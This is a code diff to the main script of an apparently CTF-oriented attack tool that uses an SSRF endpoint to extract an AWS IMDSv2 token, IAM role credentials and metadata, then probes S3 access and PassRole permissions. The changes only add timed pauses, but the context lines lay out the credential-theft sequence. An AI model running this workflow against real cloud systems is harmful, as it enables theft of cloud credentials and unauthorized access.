@@ -7,6 +7,7 @@ import {
   logSeparator,
   log,
   extractSSRFParam,
+  sleep,
 } from "./src/utils.js";
 import {
   testSSRFVulnerability,
@@ -107,6 +108,7 @@ async function main() {
   const proxyUrl = arg;
 
   displayBanner();
+  await sleep(1200);
 
   if (!proxyUrl) {
     logError("Missing required argument: SSRF endpoint URL");
@@ -128,6 +130,7 @@ async function main() {
   // Auto-detect SSRF parameter from URL
   const ssrfParam = extractSSRFParam(proxyUrl);
   CONFIG.ssrf.paramName = ssrfParam;
+  await sleep(600);
   logSeparator();
 
   try {
@@ -139,6 +142,7 @@ async function main() {
       process.exit(1);
     }
 
+    await sleep(800);
     logSeparator();
 
     logInfo(`Extracting IMDSv2 token via proxy: ${proxyUrl}`);
@@ -153,6 +157,7 @@ async function main() {
     log(`Token: ${token}`, null, "green");
 
     summary.findings.imds.token = token;
+    await sleep(800);
     logSeparator();
 
     logInfo(
@@ -163,6 +168,7 @@ async function main() {
 
     logSuccess(`Found ${iamRoles.length} IAM role(s):`);
     iamRoles.forEach(role => log(`  - ${role}`, null, "cyan"));
+    await sleep(800);
     logSeparator();
 
     logInfo(`Extracting credentials for all ${iamRoles.length} role(s)...`);
@@ -215,9 +221,11 @@ async function main() {
           });
         }
 
+        await sleep(700);
         logSeparator();
       } catch (error) {
         logError(`Failed to extract credentials for ${iamRole}: ${error.message}`);
+        await sleep(500);
         logSeparator();
       }
     }
@@ -230,6 +238,7 @@ async function main() {
     const credentials = primaryCredentials;
 
     logInfo("Performing comprehensive IMDS enumeration...");
+    await sleep(600);
 
     const allMetadata = await enumerateIMDSRecursive(proxyUrl, token);
 
@@ -240,6 +249,7 @@ async function main() {
 
     if (Object.keys(allMetadata).length > 0) {
       logInfo(`Discovered ${Object.keys(allMetadata).length} IMDS metadata entries`);
+      await sleep(600);
 
       const s3Refs = extractS3References(allMetadata);
 
@@ -247,11 +257,13 @@ async function main() {
         logSuccess(`Found ${s3Refs.bucketNames.length} potential S3 bucket reference(s) in metadata:`);
         s3Refs.bucketNames.forEach(bucket => log(`  - ${bucket}`, null, "cyan"));
         discoveredBucketNames = s3Refs.bucketNames;
+        await sleep(700);
       }
 
       if (s3Refs.urls.length > 0) {
         logSuccess(`Found ${s3Refs.urls.length} S3 URL(s) in metadata:`);
         s3Refs.urls.forEach(url => log(`  - ${url}`, null, "cyan"));
+        await sleep(700);
       }
 
       logSeparator();
@@ -282,6 +294,7 @@ async function main() {
           log(`${path}:`, null, "cyan");
           console.log(`  ${allMetadata[path]}`);
         }
+        await sleep(700);
         logSeparator();
       }
     }
@@ -295,6 +308,7 @@ async function main() {
       CONFIG.aws.defaultRegion
     );
 
+    await sleep(600);
     logSeparator();
 
     const validationResult = await validateCredentials();
@@ -309,6 +323,7 @@ async function main() {
       logError("Credentials are invalid in all tested regions.");
       logInfo("This might be a CTF scenario where credentials are intentionally restricted.");
       logInfo("Attempting to continue with permission discovery anyway...");
+      await sleep(800);
       logSeparator();
     }
 
@@ -323,9 +338,11 @@ async function main() {
       });
     }
 
+    await sleep(700);
     await checkPassRolePolicy(iamRole);
 
     logInfo("Testing S3 access for all discovered roles...");
+    await sleep(600);
     logSeparator();
 
     for (let i = 0; i < summary.findings.roles.length; i++) {
@@ -356,9 +373,11 @@ async function main() {
           logInfo(`✗ Role ${roleData.name} has no S3 access`);
         }
 
+        await sleep(500);
         logSeparator();
       } catch (error) {
         logError(`Error testing S3 for role ${roleData.name}: ${error.message}`);
+        await sleep(500);
         logSeparator();
       }
     }
@@ -401,9 +420,12 @@ async function main() {
     }
 
     logInfo("Launching interactive menu...");
+    await sleep(1000);
 
     await runInteractiveMenu(permissionResults);
 
+    logSeparator();
+    await sleep(800);
     summary.display();
 
   } catch (error) {
